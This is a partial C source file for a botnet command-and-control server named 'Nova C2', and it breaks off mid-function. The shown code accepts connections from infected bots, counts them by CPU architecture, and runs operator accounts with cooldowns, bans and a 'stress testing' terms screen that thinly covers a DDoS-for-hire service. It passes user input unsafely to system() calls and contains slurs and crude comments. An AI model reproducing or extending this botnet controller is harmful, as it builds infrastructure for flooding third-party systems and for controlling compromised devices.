#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>

#define userfile "users/login.txt"
#define MAXFDS 1000000
#define R "\e[38;5;52m"   //red
#define W "\e[38;5;164m" //pink
#define P "\e[38;5;21m"  //blue
#define N "\e[38;5;165m" //ungly pink
#define E "\e[38;5;231m" //white
#define D "\e[38;5;93m"  //purple?
#define K "\e[38;5;245m" //gray
#define Y "\e[38;5;190m" //yellow
#define B "\e[38;5;234m" //black
#define G "\e[38;5;2m" //green

char user_ip[100];
char *ipinfo[800];
char usethis[2048];   //////ALSO NIGGA, WE NEED AN IDEA FOR AN ATTACK BANNER!!! mave
char motd[512];
int loggedin = 1;
int logoutshit;
int sent = 0;
int motdaction = 1;
int Attacksend = 0;
int AttackStatus = 0;
int userssentto;
int msgoff;
char broadcastmsg[800];


struct login {
	char username[100];
	char password[100];
	char admin[50];
    char expirydate[100];
    int cooldown_timer;
    int cooldown;
    int maxtime;
};
static struct login accounts[100];
struct clientdata_t {
	    uint32_t ip;
		char x86;
		char ARM;
		char mips;
		char mpsl;
		char ppc;
		char spc;
		char unknown;
		char connected;
} clients[MAXFDS];
struct telnetdata_t {
    int connected;
    int adminstatus;
    char my_ip[100];
    char id[800];
    char planname[800];
    int mymaxtime;
    int mycooldown;
    int listenattacks;
    int cooldownstatus;// Cool Down Thread Status
    int cooldownsecs;// Cool Down Seconds Left
    int msgtoggle;// Toggles Recieving messages
    int broadcasttoggle;// Toggles Broadcast Toggle
    int LoginListen;
} managements[MAXFDS];
struct args {
    int sock;
    struct sockaddr_in cli_addr;
};

struct CoolDownArgs{
    int sock;
    int seconds;
};

struct toast {
    int login;
    int just_logged_in;
} gay[MAXFDS];


FILE *LogFile2;
FILE *LogFile3;

static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
static volatile int DUPESDELETED = 0;

void StartCldown(void *arguments)
{
	struct CoolDownArgs *args = arguments;
	int fd = (int)args->sock;
	int seconds = (int)args->seconds;
	managements[fd].cooldownsecs = 0;
	time_t start = time(NULL);
	if(managements[fd].cooldownstatus == 0)
		managements[fd].cooldownstatus = 1;
	while(managements[fd].cooldownsecs++ <= seconds) sleep(1);
	managements[fd].cooldownsecs = 0;
	managements[fd].cooldownstatus = 0;
	return;
}


int fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got;
}

static int check_expiry(const int fd) // if(year > atoi(my_year) || day > atoi(my_day) && month >= atoi(my_month) && year == atoi(my_year) || month > atoi(my_month) && year >= atoi(my_year))
{
    time_t t = time(0);
    struct tm tm = *localtime(&t);
    int day, month, year, argc = 0;
    day = tm.tm_mday; //
    month = tm.tm_mon + 1;
    year = tm.tm_year - 100;
    char *expirydate = calloc(strlen(accounts[fd].expirydate), sizeof(char));
    strcpy(expirydate, accounts[fd].expirydate);

    char *args[10 + 1];
    char *p2 = strtok(expirydate, "/");

    while(p2 && argc < 10) 
    {
        args[argc++] = p2;
        p2 = strtok(0, "/"); 
    }

    if(year > atoi(args[2]) || day > atoi(args[1]) && month >= atoi(args[0]) && year == atoi(args[2]) || month > atoi(args[0]) && year >= atoi(args[2]))
        return 1;
    return 0; 
}


int checkaccounts()
{
	FILE *file;
	if((file = fopen("users/login.txt","r")) != NULL)
	{
		fclose(file);
	} else {
		char checkaccuser[80], checkpass[80];
		printf("Username:");
		scanf("%s", checkaccuser);
		printf("Password:");
		scanf("%s", checkpass);
		char reguser[80];
		char thing[80];
		sprintf(thing, "%s %s Admin 1200 0 99/99/9999");
		sprintf(reguser, "echo '%s' >> users/login.txt", thing);
		system(reguser);
		printf("login.txt was Missing It has Now Been Created\r\nWithout this the screenw ould crash instantly\r\n");
	}
}
int checklog()
{
	FILE *logs1;
	if((logs1 = fopen("logs/", "r")) != NULL)
	{
		fclose(logs1);
	} else {
		char mkdir[80];
		strcpy(mkdir, "mkdir logs");
		system(mkdir);
		printf("Logs Directory Was Just Created\r\n");
	}
	FILE *logs2;
	if((logs2 = fopen("logs/IPBANNED.txt", "r")) != NULL)
	{
		fclose(logs2);
	} else {
		char makeipbanned[800];
		strcpy(makeipbanned, "cd logs; touch IPBANNED.txt");
		system(makeipbanned);
		printf("IPBANNED.txt Was Not In Logs... It has been created\r\nWithout This File The C2 would crash the instant you open it\r\n");
	}
	FILE *logs3;
	if((logs3 = fopen("logs/BANNEDUSERS.txt", "r")) != NULL)
	{
		fclose(logs3);
	} else {
		char makeuserbanned[800];
		strcpy(makeuserbanned, "cd logs; touch BANNEDUSERS.txt");
		system(makeuserbanned);
		printf("BANNEDUSERS.txt Was Not In Logs... It Has Been Created\r\nWithout This File The C2 would crash the instant you put your Username And Password In\r\n");
	}
	FILE *logs4;
	if((logs4 = fopen("logs/Blacklist.txt", "r")) != NULL)
	{
		fclose(logs4);
	} else {
		char makeblacklist[800];
		strcpy(makeblacklist, "cd logs; touch Blacklist.txt");
		system(makeblacklist);
		printf("Blacklist.txt Was Not In Logs... It Has Been Created\r\nWithout This File The C2 would crash the instant you Send An Attack\r\n");
	}
}
void trim(char *str) {
	int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd) {
	int flags, s;
	flags = fcntl (sfd, F_GETFL, 0);
	if (flags == -1) {
		perror ("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	s = fcntl (sfd, F_SETFL, flags);
    if (s == -1) {
		perror ("fcntl");
		return -1;
	}
	return 0;
}
int resolvehttp(char *  , char *);
int resolvehttp(char * site , char* ip)
{
    struct hostent *he;
    struct in_addr **addr_list;
    int i;
    if ( (he = gethostbyname( site ) ) == NULL)
    {
        // get the host info
        herror("gethostbyname");
        return 1;
    }
    addr_list = (struct in_addr **) he->h_addr_list;
    for(i = 0; addr_list[i] != NULL; i++)
    {
        //Return the first one;
        strcpy(ip , inet_ntoa(*addr_list[i]) );
        return 0;
    }
    return 1;
}
static int create_and_bind (char *port) {
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0) {
		fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next) {
		sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		int yes = 1;
		if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
		s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0) {
			break;
		}
		close (sfd);
	}
	if (rp == NULL) {
		fprintf (stderr, "Could not bind\n");
		return -1;
	}
	freeaddrinfo (result);
	return sfd;
}

void broadcast(char *msg, int us, char *sender)
{
    int i;

    for(i = 0; i < MAXFDS; i++)
    {
        if(clients[i].connected >= 1)
        {
            send(i, msg, strlen(msg), MSG_NOSIGNAL);
            send(i, "\n", 1, MSG_NOSIGNAL);
        }
    }
}


void *BotEventLoop(void *useless)
{
	struct epoll_event event;
	struct epoll_event *events;
	int s;
	events = calloc(MAXFDS, sizeof event);
	while (1)
	{
		int n, i;
		n = epoll_wait(epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++)
		{
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
			{
				clients[events[i].data.fd].connected = 0;
                clients[events[i].data.fd].x86 = 0;
                clients[events[i].data.fd].ARM = 0;
                clients[events[i].data.fd].mips = 0;
                clients[events[i].data.fd].mpsl = 0;
                clients[events[i].data.fd].ppc = 0;
                clients[events[i].data.fd].spc = 0;
                clients[events[i].data.fd].unknown = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd)
			{
				while (1)
				{
					struct sockaddr in_addr;
					socklen_t in_len;
					int infd, ipIndex;

					in_len = sizeof in_addr;
					infd = accept(listenFD, &in_addr, &in_len);
					if (infd == -1)
					{
						if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
						else
						{
							perror("accept");
							break;
						}
					}

					clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;

					int dup = 0;
					for (ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
					{
						if (!clients[ipIndex].connected || ipIndex == infd) continue;

						if (clients[ipIndex].ip == clients[infd].ip)
						{
							clients[infd].connected--;
							dup = 1;
							break;
						}
					}

					s = make_socket_non_blocking(infd);
					if (s == -1) { close(infd); break; }

					event.data.fd = infd;
					event.events = EPOLLIN | EPOLLET;
					s = epoll_ctl(epollFD, EPOLL_CTL_ADD, infd, &event);
					if (s == -1)
					{
						perror("epoll_ctl");
						close(infd);
						break;
					}

					clients[infd].connected = 1;

				}
				continue;
			}
			else
			{
				int thefd = events[i].data.fd;
				struct clientdata_t *client = &(clients[thefd]);
				int done = 0;
				client->connected = 1;
		        client->x86 = 0;
		        client->ARM = 0;
		        client->mips = 0;
		        client->mpsl = 0;
		        client->ppc = 0;
		        client->spc = 0;
		        client->unknown = 0;
				while (1)
				{
					ssize_t count;
					char buf[2048];
					memset(buf, 0, sizeof buf);

					while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
					{
						if (strstr(buf, "\n") == NULL) { done = 1; break; }
						trim(buf);
						if (strcmp(buf, "PING") == 0) {
							if (send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
							continue;
						}

										        if(strstr(buf, "x86_64") == buf)
												{
													client->x86 = 1;
												}
												if(strstr(buf, "x86_32") == buf)
												{
													client->x86 = 1;
												}
												if(strstr(buf, "ARM4") == buf)
												{
													client->ARM = 1; 
												}
												if(strstr(buf, "ARM5") == buf)
												{
													client->ARM = 1; 
												}
												if(strstr(buf, "ARM6") == buf)
												{
													client->ARM = 1; 
												}
												if(strstr(buf, "MIPS") == buf)
												{
													client->mips = 1; 
												}
												if(strstr(buf, "MPSL") == buf)
												{
													client->mpsl = 1; 
												}
												if(strstr(buf, "PPC") == buf)
												{
													client->ppc = 1;
												}
												if(strstr(buf, "SPC") == buf)
												{
													client->spc = 1;
												}					
												if(strstr(buf, "idk") == buf)
												{
													client->unknown = 1;
												}					
																							
						if (strcmp(buf, "PONG") == 0) {
							continue;
						}
						printf("BOT:\"%s\"\n", buf);
					}

					if (count == -1)
					{
						if (errno != EAGAIN)
						{
							done = 1;
						}
						break;
					}
					else if (count == 0)
					{
						done = 1;
						break;
					}
				}

				if (done)
				{
					client->connected = 0;
		            client->x86 = 0;
		            client->ARM = 0;
		            client->mips = 0;
		            client->mpsl = 0;
		            client->ppc = 0;
		            client->spc = 0;
		            client->unknown = 0;
				  	close(thefd);
				}
			}
		}
	}
}


unsigned int x86Connected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].x86) continue;
                total++;
        }
 
        return total;
}
unsigned int armConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].ARM) continue;
                total++;
        }
 
        return total;
}
unsigned int mipsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].mips) continue;
                total++;
        }
 
        return total;
}
unsigned int mpslConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].mpsl) continue;
                total++;
        }
 
        return total;
}
unsigned int ppcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].ppc) continue;
                total++;
        }
 
        return total;
}
unsigned int spcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].spc) continue;
                total++;
        }
 
        return total;
}
unsigned int unknownConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].unknown) continue;
                total++;
        }
 
        return total;
}


unsigned int botsconnect()
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].connected) continue;
		total++;
	}

	return total;
}
int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("users/login.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return find_line;
}



void checkHostName(int hostname) 
{ 
    if (hostname == -1) 
    { 
        perror("gethostname"); 
        exit(1); 
    } 
} 
 void client_addr(struct sockaddr_in addr){

        sprintf(ipinfo, "%d.%d.%d.%d",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
    }

void *TitleWriter(void *sock) {
	int datafd = (int)sock;
    char string[2048];
    while(1) {
		memset(string, 0, 2048);
		if(gay[datafd].login == 2)
		{
        	sprintf(string, "%c]0; Welcome To Nova Please Login %c", '\033', '\007');
        } else {
        	if(managements[datafd].cooldownstatus == 1)
        	{
        		sprintf(string, "%c]0; Bots Connected: %d | %s | %s | Cooldown: %d %c", '\033', botsconnect(), managements[datafd].id, managements[datafd].planname, managements[datafd].mycooldown - managements[datafd].cooldownsecs, '\007');
        	} 
        	else if(managements[datafd].cooldownstatus == 0)
        	{
        		sprintf(string, "%c]0; Bots Connected: %d | %s | %s |%c", '\033', botsconnect(), managements[datafd].id, managements[datafd].planname, '\007');
        	}
        }
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
		sleep(2);
		}
}

       
void *BotWorker(void *sock)
{
	int datafd = (int)sock;
	int find_line;
	OperatorsConnected++;
    pthread_t title;
    gay[datafd].login = 2;
    pthread_create(&title, NULL, &TitleWriter, sock);
    char buf[2048];
	char* username;
	char* password;
	char* admin = "admin";
	memset(buf, 0, sizeof buf);
	char botnet[2048];
	memset(botnet, 0, 2048);
	char botcount [2048];
	memset(botcount, 0, 2048);
	char statuscount [2048];
	memset(statuscount, 0, 2048);
	
	FILE *fp;
	int i=0;
	int c;
	fp=fopen("users/login.txt", "r");
	while(!feof(fp)) {
		c=fgetc(fp);
		++i;
	}
    int j=0;
    rewind(fp);
    while(j!=i-1) {
		fscanf(fp, "%s %s %s %d %d %s", accounts[j].username, accounts[j].password, accounts[j].admin, &accounts[j].maxtime, &accounts[j].cooldown, accounts[j].expirydate);
		++j;
		
	}	

		char *line1 = NULL;
        size_t n1 = 0;
        FILE *f1 = fopen("logs/IPBANNED.txt", "r");
            while (getline(&line1, &n1, f1) != -1){
                if (strstr(line1, ipinfo) != NULL){
                    sprintf(botnet, ""Y"YOU HAVE BEEN IP BANNED BY MAVS COCK CONTACT AN ADMIN!\r\n");
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                    
                    sleep(5);
                    goto end;
            }
        }
        fclose(f1);
        free(line1);


		char clearscreen [2048];
		memset(clearscreen, 0, 2048);
		sprintf(clearscreen, "\033[2J\033[1;1H");
        {
        char login1  [5000];
        char login2  [5000];
        char login3  [5000];
        char login4  [5000];
        char login5  [5000];
        char login6  [5000];
        char login7  [5000];
        char login8  [5000];
        char login9  [5000];
        char login10 [5000];
        char login11 [5000];	
		char username [5000];

		sprintf(login1,    "\r\n");
		sprintf(login2,    "\t\t      "W" â–ˆâ–ˆ"P"â–“     â–’"W"â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ    â–„â–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆ"P"â–“ "W"â–ˆâ–ˆâ–ˆâ–„    â–ˆ \r\n");
		sprintf(login3,    "\t\t      "P"â–“"W"â–ˆâ–ˆ"P"â–’    â–’"W"â–ˆâ–ˆ"P"â–’  "W"â–ˆâ–ˆ"P"â–’ "W"â–ˆâ–ˆ"P"â–’ "W"â–€â–ˆ"P"â–’â–“"W"â–ˆâ–ˆ"P"â–’ "W"â–ˆâ–ˆ â–€â–ˆ   â–ˆ \r\n");
		sprintf(login4,    "\t\t      "P"â–’"W"â–ˆâ–ˆ"P"â–‘    â–’"W"â–ˆâ–ˆ"P"â–‘  "W"â–ˆâ–ˆ"P"â–’â–’"W"â–ˆâ–ˆ"P"â–‘"W"â–„â–„â–„"P"â–‘â–’"W"â–ˆâ–ˆ"P"â–’â–“"W"â–ˆâ–ˆ  â–€â–ˆ â–ˆâ–ˆ"P"â–’\r\n");
		sprintf(login5,    "\t\t      "P"â–’"W"â–ˆâ–ˆ"P"â–‘    â–’"W"â–ˆâ–ˆ   â–ˆâ–ˆ"P"â–‘â–‘â–“"W"â–ˆ  â–ˆâ–ˆ"P"â–“â–‘"W"â–ˆâ–ˆ"P"â–‘â–“"W"â–ˆâ–ˆ"P"â–’  "W"â–â–Œâ–ˆâ–ˆ"P"â–’\r\n");
		sprintf(login6,    "\t\t      "P"â–‘"W"â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ"P"â–’â–‘ "W"â–ˆâ–ˆâ–ˆâ–ˆ"P"â–“â–’â–‘â–‘â–’â–“"W"â–ˆâ–ˆâ–ˆâ–€"P"â–’â–‘"W"â–ˆâ–ˆ"P"â–‘â–’"W"â–ˆâ–ˆ"P"â–‘   â–“"W"â–ˆâ–ˆ"P"â–‘\r\n");
		sprintf(login7,    "\t\t      "P"â–‘ â–’â–‘â–“  â–‘â–‘ â–’â–‘â–’â–‘â–’â–‘  â–‘â–’   â–’ â–‘â–“  â–‘ â–’â–‘   â–’ â–’ \r\n");
		sprintf(login8,    "\t\t      "P"â–‘ â–‘ â–’  â–‘  â–‘ â–’ â–’â–‘   â–‘   â–‘  â–’ â–‘â–‘ â–‘â–‘   â–‘ â–’â–‘\r\n");
		sprintf(login9,    "\t\t      "P"  â–‘ â–‘   â–‘ â–‘ â–‘ â–’  â–‘ â–‘   â–‘  â–’ â–‘   â–‘   â–‘ â–‘ \r\n");
		sprintf(login10,   "\t\t      "P"    â–‘  â–‘    â–‘ â–‘        â–‘  â–‘           â–‘ \r\n");
		sprintf(login11,   "\r\n");
        sprintf(username,  ""W"Username:"P"", accounts[find_line].username);
        
        if(send(datafd, login1, strlen(login1),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, login2, strlen(login2),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, login3, strlen(login3),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, login4, strlen(login4),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, login5, strlen(login5),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, login6, strlen(login6),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, login7, strlen(login7),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, login8, strlen(login8),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, login9, strlen(login9),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, login10, strlen(login10),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, login11, strlen(login11),MSG_NOSIGNAL)== -1) goto end;
		if(send(datafd, username, strlen(username), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;

        trim(buf);

        char nickstring[30];
        strcpy(nickstring, buf);
	    memset(buf, 0, sizeof(buf));
	    find_line = Find_Login(nickstring);
        memset(buf, 0, 2048);

		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;

		char pass1  [5000];
        char pass2  [5000];
        char pass3  [5000];
        char pass4  [5000];
        char pass5  [5000];
        char pass6  [5000];
        char pass7  [5000];
        char pass8  [5000];
        char pass9  [5000];
        char pass10 [5000];
        char pass11 [5000];
		char password [5000];

		sprintf(pass1,    "\r\n");
		sprintf(pass2,    "\t\t      "W" â–ˆâ–ˆ"P"â–“     â–’"W"â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ    â–„â–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆ"P"â–“ "W"â–ˆâ–ˆâ–ˆâ–„    â–ˆ \r\n");
		sprintf(pass3,    "\t\t      "P"â–“"W"â–ˆâ–ˆ"P"â–’    â–’"W"â–ˆâ–ˆ"P"â–’  "W"â–ˆâ–ˆ"P"â–’ "W"â–ˆâ–ˆ"P"â–’ "W"â–€â–ˆ"P"â–’â–“"W"â–ˆâ–ˆ"P"â–’ "W"â–ˆâ–ˆ â–€â–ˆ   â–ˆ \r\n");
		sprintf(pass4,    "\t\t      "P"â–’"W"â–ˆâ–ˆ"P"â–‘    â–’"W"â–ˆâ–ˆ"P"â–‘  "W"â–ˆâ–ˆ"P"â–’â–’"W"â–ˆâ–ˆ"P"â–‘"W"â–„â–„â–„"P"â–‘â–’"W"â–ˆâ–ˆ"P"â–’â–“"W"â–ˆâ–ˆ  â–€â–ˆ â–ˆâ–ˆ"P"â–’\r\n");
		sprintf(pass5,    "\t\t      "P"â–’"W"â–ˆâ–ˆ"P"â–‘    â–’"W"â–ˆâ–ˆ   â–ˆâ–ˆ"P"â–‘â–‘â–“"W"â–ˆ  â–ˆâ–ˆ"P"â–“â–‘"W"â–ˆâ–ˆ"P"â–‘â–“"W"â–ˆâ–ˆ"P"â–’  "W"â–â–Œâ–ˆâ–ˆ"P"â–’\r\n");
		sprintf(pass6,    "\t\t      "P"â–‘"W"â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ"P"â–’â–‘ "W"â–ˆâ–ˆâ–ˆâ–ˆ"P"â–“â–’â–‘â–‘â–’â–“"W"â–ˆâ–ˆâ–ˆâ–€"P"â–’â–‘"W"â–ˆâ–ˆ"P"â–‘â–’"W"â–ˆâ–ˆ"P"â–‘   â–“"W"â–ˆâ–ˆ"P"â–‘\r\n");
		sprintf(pass7,    "\t\t      "P"â–‘ â–’â–‘â–“  â–‘â–‘ â–’â–‘â–’â–‘â–’â–‘  â–‘â–’   â–’ â–‘â–“  â–‘ â–’â–‘   â–’ â–’ \r\n");
		sprintf(pass8,    "\t\t      "P"â–‘ â–‘ â–’  â–‘  â–‘ â–’ â–’â–‘   â–‘   â–‘  â–’ â–‘â–‘ â–‘â–‘   â–‘ â–’â–‘\r\n");
		sprintf(pass9,    "\t\t      "P"  â–‘ â–‘   â–‘ â–‘ â–‘ â–’  â–‘ â–‘   â–‘  â–’ â–‘   â–‘   â–‘ â–‘ \r\n");
		sprintf(pass10,   "\t\t      "P"    â–‘  â–‘    â–‘ â–‘        â–‘  â–‘           â–‘ \r\n");
		sprintf(pass11,   "\r\n");
        sprintf(password,  ""W"Password:"P"", accounts[find_line].password);

        if(send(datafd, pass1, strlen(pass1),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, pass2, strlen(pass2),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, pass3, strlen(pass3),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, pass4, strlen(pass4),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, pass5, strlen(pass5),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, pass6, strlen(pass6),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, pass7, strlen(pass7),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, pass8, strlen(pass8),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, pass9, strlen(pass9),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, pass10, strlen(pass10),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, pass11, strlen(pass11),MSG_NOSIGNAL)== -1) goto end;
		if(send(datafd, password, strlen(password), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;        
        char passwordl[800];
        trim(buf);
        strcpy(passwordl, buf);
        memset(buf, 0, 2048);
		
		char *line2 = NULL;
        size_t n2 = 0;
        FILE *f2 = fopen("logs/BANNEDUSERS.txt", "r");
            while (getline(&line2, &n2, f2) != -1){
                if (strstr(line2, nickstring) != NULL){
                    if(send(datafd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
                    sprintf(usethis, ""Y"YOU HAVE BEEN BANNED BY MAVS COCK CONTACT AN ADMIN!\r\n");
                    if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) return;                    
                    sleep(5);
                    goto end;
            }
        }
        fclose(f2);
        free(line2);

        if(strcmp(accounts[find_line].username, nickstring) != 0 || strcmp(accounts[find_line].password, passwordl) != 0){ goto failed;}
        if(strcmp(accounts[find_line].username, nickstring) == 0 || strcmp(accounts[find_line].password, passwordl) == 0)
        { 
        	int toast;
        	for(toast=0;toast < MAXFDS;toast++){
            	if(!strcmp(managements[toast].id, nickstring))
            	{
            		char bad[800];
            		sprintf(bad, ""Y"User %s Is already Logged in Dipshit\r\n", nickstring);
            		if(send(datafd, bad, strlen(bad), MSG_NOSIGNAL) == -1) goto end;

            		sprintf(usethis, "\r\n"Y"Message From Nova C2:\r\nSomeone Tried To Login To Your Account Contact An Admin\r\n");
            		if(send(toast, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;

            		sprintf(usethis, ""W"%s@"P"Nova~#"E"", nickstring);
            		if(send(toast, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;

            		memset(nickstring, 0, sizeof(nickstring));
            		memset(passwordl, 0, sizeof(passwordl));
            		sleep(5);
            		goto end;
            	}
        	}

        	char gya[800];

        	sprintf(gya, "\033[2J\033[1;1H");
        	if(send(datafd, gya, strlen(gya), MSG_NOSIGNAL) == -1) goto end;
            
            char tos0[800];
        	char tos1[800];
        	char tos2[800];
        	char tos3[800];
        	char tos4[800];
        	char tos5[800];
        	char tos6[800];
        	char tos7[800];
        	char tos8[800];
        	char tos9[800];
        	char tos10[800];
        	char tos11[800];

        	sprintf(tos0,  "\r\n");
        	sprintf(tos1,  "\t"P"â•”"W"==================================================================="P"â•—\r\n");  
			sprintf(tos2,  "\t"P"|"W"â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"P"|\r\n"); 
			sprintf(tos3,  "\t"P"|                                                                   |\r\n"); 
			sprintf(tos4,  "\t"P"|   "E"This Is A Service Used For Stress Testing Personal Servers.     "P"|\r\n"); 
			sprintf(tos5,  "\t"P"|   "E"Any Malicious Attacks Sent Are Held Responsible by the User.    "P"|\r\n"); 
			sprintf(tos6,  "\t"P"|   "E"Sending An Abundant Amount Of Tests Can Result In A Perm Ban.   "P"|\r\n"); 
			sprintf(tos7,  "\t"P"|   "E"Aswell As Sharing Login Info With Other People.                 "P"|\r\n"); 
			sprintf(tos8,  "\t"P"|   "E"If Your Account Was Banned You Can Not Claim We Scammed.        "P"|\r\n"); 
			sprintf(tos9,  "\t"P"|   "E"Do Not Share The Host IP Or Login Details.                      "P"|\r\n"); 
			sprintf(tos10, "\t"P"|                                                                   |\r\n"); 
			sprintf(tos11, "\t"P"â•š"W"==================================================================="P"â•\r\n"); 
						
			if(send(datafd, tos0, strlen(tos0), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, tos1, strlen(tos1), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, tos2, strlen(tos2), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, tos3, strlen(tos3), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, tos4, strlen(tos4), MSG_NOSIGNAL) == -1) goto  end;
			if(send(datafd, tos6, strlen(tos6), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, tos7, strlen(tos7), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, tos8, strlen(tos8), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, tos9, strlen(tos9), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, tos10, strlen(tos10), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, tos11, strlen(tos11), MSG_NOSIGNAL) == -1) goto end;

			sprintf(usethis, "\r\n \e[38;5;45mDo You Agree To TOS \033[92m[\e[97mYes\e[38;5;45m or \e[97mNo\033[92m]:\033[97m");
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			memset(buf, 0,sizeof(buf));
			if(fdgets(buf, sizeof(buf), datafd) > 1);
			trim(buf);

			if(strcasestr(buf, "Yes") || strcasestr(buf, "y"))
			{
				char sendtos[8000];
				char log1[800];
				sprintf(sendtos, "echo '%s Accepted TOS!' >> logs/AcceptedTos.txt", nickstring);
				system(sendtos);
				sprintf(log1, "echo '%s IP: %s' >> logs/LoggedUsers.txt", nickstring, ipinfo);
				system(log1);
				memset(nickstring, 0, sizeof(nickstring));
				sleep(2);
				loggedin = 0;
				goto Banner;
			} else 
			{
